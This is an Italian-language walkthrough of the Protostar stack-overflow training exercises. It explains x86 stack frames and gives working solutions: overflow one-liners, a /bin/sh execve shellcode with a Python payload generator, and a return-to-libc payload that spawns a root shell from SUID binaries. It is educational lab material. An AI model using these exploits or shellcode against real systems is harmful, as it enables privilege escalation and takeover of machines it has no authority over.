# Protostar

## Info utili
Si accede alle challenge con:
- **user**: user
- **passwd**: user

Dopo l’autenticazione, l’utente user usa le informazioni contenute nella directory **/opt/protostar/bin** per conseguire uno specifico obiettivo.

Login amministratore:
- **user**: root
- **passwd**: godmode

[Website](https://exploit.education/protostar/)

## Spiegazione stack
Lo stack è una area di memoria fondamentale per l'esecuzione delle funzioni di un programma. In molte architetture lo stack cresce verso indirizzi di memoria inferiori, questo significa che quando viene pushato qualcosa sullo stack lo si mette nell'indirizzo più basso dello stack.

Lo stack funziona principalmente grazie a due registri della CPU:
- **ESP** ovvero lo stack pointer che contiene il puntatore all'ultimo dato pushato sullo stack, in altre parole l'indirizzo di memoria corrispondente è il più basso dello stack
- **EBP** ovvero base pointer che contiene il puntatore a un "punto base" tramite il quale è possibile accedere alle variabili locali di una funzione e ai parametri

### Prologo funzione
Quando una funzione va in esecuzione viene eseguito un prologo:
```x86asm
push %ebp #salvataggio sullo stack del valore di ebp corrente
mov %esp, %ebp #il nuovo base pointer viene fatto corrispondere allo stack pointer attuale
sub $N, %esp #viene sottratto una certa quantità di byte N allo stack pointer in modo da creare lo stack frame della funzione chiamata, che ospita variabili locali e variabile di ritorno
```

### Epilogo funzione
Quando viene incontrata una nuova funzione viene salvato sullo stack l'indirizzo di ritorno, che corrisponde alla prossima istruzione da eseguire una volta che la funzione chiamata termina

Quando una funzione termina viene eseguito un epilogo:
```x86asm
mov %ebp, %esp #lo stack pointer viene settato uguale al base pointer, perchè la funzione sta terminando e possiamo sbarazzarci dello stack frame
pop %ebp #il saved ebp viene inserito nel registro ebp per farlo corrispondere al base pointer della funzione chiamante (precedente)
pop %eip #viene prelevato il return address e inserito nell'instruction pointer per continuare l'esecuzione
```

### Parametri funzione e valore di ritorno
I parametri di una funzione sono *di solito* passati tramite lo stack, in base alla calling convention i comportamenti possono leggermente variare.

Il valore di ritorno di una funzione viene sempre copiato nel registro **eax**.

### Syscall x86 (protostar)
Per effettuare chiamate di sistema si utilizzano 7 registri in totale:
- **EAX** contiene il numero della syscall
- **EBX, ECX, EDX, ESI, EDI, EBP** contengono gli eventuali parametri

[Elenco syscall x86](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)

[Ulteriori dettagli stack](https://manybutfinite.com/post/journey-to-the-stack/)

## Soluzioni challenge

### Stack00

Viene allocata una variabile int *modified* e un array di char *buffer* da 64 char. Disassemblando con gdb si nota che viene fatto spazio per 0x80 byte (96 byte in decimale) che corrisponde esattamente alla dimensione delle due variabili locali. *modified* viene allocato prima di *buffer* e questo implica che tramite funzione vulnerabile *gets* si può andare in overflow su *modified*.

Si esegue il seguente comando:
```bash
python -c "print 'a'*65" | ./stack0
```
In questo modo il 65esimo carattere 'a' andrà in overflow e modificherà il valore di *modified*.

#### Fix: Lettura di un numero indefinito di caratteri tramite gets
Per impedire il buffer overflow occorre semplicemente utilizzare la funzione *fgets* al posto di *gets*.
```c
fgets(buffer, 64, stdin);
```

### Stack01

Similmente al livello precedente, la funzione *strcpy* è vulnerabile perchè copia in *buffer* il valore dell'argomento fino a quando non incontra il terminatore: questo può causare overflow su *modified*.

Si esegue il seguente comando:
```bash
python -c "print 'a'*64+'dcba'" #generazione payload da copiare nell'argomento dell'eseguibile
./stack1 payload
```
Il valore di *modified* deve essere settato a **0x61626364**. Dato che è un intero e protostar è in little endian, occorre scrivere in memoria in verso opposto a quanto scritto nel file sorgente, per questo nel payload la sequenza "abcd" risulta invertita.

### Stack02

Qui la *strcpy* viene effettuata a partire dalla variabile d'ambiente *GREENIE*. Occorre modificare questa per fare overflow. In questo caso il valore di *modified* deve essere settato a **0x0d0a0d0a** (in ordine inverso). Il comando da eseguire è quindi il seguente:
```bash
export GREENIE=$(echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\r\n\r")
```
In questo modo *GREENIE* contiene anche i caratteri non stampabili richiesti dal livello.

Eseguire infine stack2 per completare il livello.

### Stack03

In questo caso occorre sovrascrivere il puntatore a funzione contenuto nella variabile *modified*. Trattandosi di un'architettura a 32 bit occorre sovrascrivere 4 byte tramite buffer overflow. 

Per trovare l'indirizzo della funzione win() occorre avviare gdb:
```bash
info functions #nomi di tutte le funzioni del file
p &win #stampa indirizzo di win
```

L'indirizzo trovato, ad esempio *0x8048424* deve essere inserito nel payload in modo inverso.
```bash
python -c "print 'a'*64+'\x24\x84\x04\x08'" | ./stack3
```

### Stack04

La challenge richiede di sovrascrivere l'indirizzo di ritorno della funzione main, in modo da eseguire la funzione *win*.

Prima di tutto occorre trovare l'indirizzo di memoria in cui è memorizzato l'indirizzo di ritorno. Questa informazione è ottenibile tramite gdb.
```bash
info frame
```

Nell'output compare il *saved eip*, con il rispettivo indirizzo di memoria in cui è salvato. Occorre sovrascrivere il contenuto di questo indirizzo che, attualmente porta alla prossima istruzione di *__libc_start_main*, che è la funzione a cui bisogna tornare dopo che il main finisce di eseguire.

Per come sono disposti i dati sullo stack in questa architettura, si sa che oltre al buffer, sono presenti il saved ebp e infine l'indirizzo di ritorno, quindi si dovrebbe provocare un overflow inserendo 68 byte, a cui segue l'indirizzo della funzione *win*. In realtà, però possono essere presenti altri dati sullo stack in base alle variabili di ambiente, o ad alcune azioni da parte del compilatore, ecc... Occorre quindi verificare che la posizione sia quella giusta.

Per farlo, si imposta un breakpoint nel main alla riga seguente
```text
0x0804841d <main+21>:	leave  
```

Utilizzando
```bash
b *main+21
```

Si esegue il programma e si inserisce come input la stringa "abcd". Successivamente si incontra il breakpoint e si analizza lo stack. L'inidirizzo di memoria in cui compare la a sarà l'indirizzo di memoria in cui inzia il buffer.
```bash
x/40xw $esp
```
*NB: Il metodo appena proposto può essere usato come alternativa al metodo più "elegante" proposto nei livelli successivi al momento della ricerca dell'indirizzo di buffer*

Si prende nota dell'inidirizzo e si fa la differenza con il *saved eip* trovato prima. Dovranno essere inserite quindi N char + l'indirizzo della funzione *win* (ricordandosi che si sta lavorando su un'architettura little endian). Si trova l'indirizzo di *win* tramite il seguente comando
```bash
p &win
```

Infine, per provocare l'esecuzione della funzione malevola occorre lanciare l'eseguibile come segue
```bash
echo -ne "a*N+indirizzo_win" | ./stack4
```
Dove **N** e **indirizzo_win** sono i dati che si sono trovati con i passaggi sopra.

### Stack05
Il binario è vulnerabile a buffer overflow. L'obiettivo qui è quello di iniettare codice arbitrario sullo stack detto *shellcode* perchè costituito da istruzioni assembly che permettono di ottenere una shell con i permessi di root (siccome il binario è SUID root). Oltre a iniettare lo shellcode occorre sovrascrivere l'indirizzo di ritorno della funzione *main*.

Occorre prima calcolare il numero di byte di distanza tra l'indirizzo del buffer e l'indirizzo di ritorno, in modo da provocare il corretto buffer overflow. Si apre quindi l'eseguibile con gdb, si eliminano le variabili di ambiente in eccesso e si disassembla il main.

*NB: Le variabili d'ambiente devono essere rimosse in quanto altrimenti l'ambiente di gdb e quello di sh non sarebbero sincronizzati, impedendo di iniettare qualsiasi tipo di indirizzo che punta allo stack (in questo caso, ad esempio, deve essere iniettato l'indirizzo dello shellcode, corrispondente all'indirizzo del buffer). Se non venissero rimosse le variabili d'ambiente i dati sullo stack non sarebbero caricati agli stessi indirizzi in un'esecuzione su gdb e in una su sh.*

```bash
unset env LINES
unset env COLUMNS
disas main
```
Il codice disassemblato è il seguente
```x86asm
0x080483c4 <main+0>:	push   %ebp
0x080483c5 <main+1>:	mov    %esp,%ebp
0x080483c7 <main+3>:	and    $0xfffffff0,%esp
0x080483ca <main+6>:	sub    $0x50,%esp
0x080483cd <main+9>:	lea    0x10(%esp),%eax
0x080483d1 <main+13>:	mov    %eax,(%esp)
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret  
```
In cui:
- **main+6** crea lo stack frame di 0x50 byte
- **main+9** carica in *eax* l'indirizzo puntato da *esp*, con 16 byte di offset
- **main+13** carica *eax* sulla cima dello stack
- **main+16** invoca la *gets*, questo implica che il suo parametro buffer è sullo stack e corrisponde proprio al valore del registro *eax*

Si setta quindi un breakpoint a **main+16** e si esegue il programma, successivamente si estraggono i valori di *eax* e l'indirizzo di memoria del return address.
Per *eax* si esegue:
```bash
info registers
#oppure
x/xw $eax
```
Per sapere l'indirizzo di ritorno:
```bash
info frame #prelevare posizione di eip in memoria
#oppure
p $ebp+4
```

Una volta ottenuti questi dati occorre sottrarre all'indirizzo di *buffer*, il return address. In questo modo si ottiene il numero di byte necessario a provocare l'overflow desiderato. Dovrà quindi essere costruito un payload del tipo:
```text
shellcode + padding + buffer_address
```
In cui **shellcode + padding** devono avere una dimensione pari a quella necessaria per il buffer overflow, **buffer_address** invece avrà dimensione di 4byte. 

Lo shellcode è il seguente
```x86asm
xor %eax,%eax #azzeramento di eax
push %eax 
push $0x68732f2f #/bin/sh scritto in byte
push $0x6e69622f
mov %esp,%ebx #indirizzo del comando da eseguire
mov %eax,%ecx #azzeramento ecx
mov %eax,%edx #azzeramento edx
mov $0xb,%al #carica il valore della chiamata di sistema negli 8 bit meno significativi di eax
int $0x80 #chiamata di sistema execve()
xor %eax,%eax
inc %eax #eax = 1 
int $0x80 #chiamata di sistema exit() per uscire dal programma
```

Per caricare lo shellcode sullo stack occorre convertirlo in byte, creare il padding e settare il return address. Si usa il seguente script python per generare un file da dare poi in input all'eseguibile.
```py
#!/usr/bin/python
# Parametri da impostare
length = 76
ret = '\x00\x00\x00\x00'
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
            "\x68\x68\x2f\x62\x69\x6e\x89" + \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
            "\xcd\x80\x31\xc0\x40\xcd\x80";
padding = 'a' * (length - len(shellcode))
payload = shellcode + padding + ret
print payload
#print shellcode
```
Successivamente
```bash
python exploit.py > exploit.txt
(cat exploit.txt; cat) | /opt/protostar/bin/stack5
```
I due *cat* successivi servono a tenere aperta la shell che viene generata dato che il secondo comando *cat* da solo resta in attesa di caratteri da stdin e non chiude quindi il pipe con l'eseguibile.

## Stack06
La difficoltà di questo binario è dato dal fatto che non si può fare un overflow sul return address impostando come indirizzo di ritorno una cella di memoria appartenente allo stack. Per aggirare questa difesa quindi occorre fare un return ad una porzione di codice già presente nel binario.

Si tenta di eseguire un attacco di tipo **return to libc**, ovvero si reindirizza il flusso nello specifico alla funzizone *system()* di libc che permette di eseguire un comando specificato da parametro. Pur se non necessario si passa poi alla funzione *exit()* che permette di chiudere il programma senza crash (questo è evitabile dal momento che la shelle verrebbe comunque spawnata). Quindi in sostanza si vuole che il return address di *getpath* corrisponda all'indirizzo di *system* e il return address di *system* corrisponda all'indirizzo di *exit*.

Innanzitutto occorre calcolare la differenza tra inizio del buffer e return address di *getpath*, si procede quindi nello stesso modo visto nel livello precedente. In particolare:
```bash
unset env COLUMNS
unset env LINES

disas getpath
b *getpath+38 #chiamata di gets
run

info registers #eax contiene indirizzo di buffer
info frame #prelevare indirizzo di memoria di eip
```

La differenza tra i due indirizzi corrisponde alla dimensione del payload, a cui va aggiunto l'indirizzo di *system*, l'indirizzo di *exit* e infine l'indirizzo del buffer, che viene prelevato come parametro da *system* che interpreta il suo return address come *exit* e il suo parametro il buffer.

Per ottenere l'indirizzo di *system* e quello di *exit* occorre eseguire in gdb le seguenti istruizioni:
```bash
p &system
p &exit
```

Ottenuti anche questi due indirizzi si può proseguire con l'exploit tramite uno script python che genera un file di testo da dare in pipe all'eseguibile vulnerabile.
```py
print '/bin//sh\x00' + 'a' * 71 + system_address + exit_address + buffer_address  
```

Si genera il file di testo e si esegue l'exploit come fatto per il livello precedente.
```bash
(cat exploit.txt; cat) | /opt/protostar/bin/stack6
```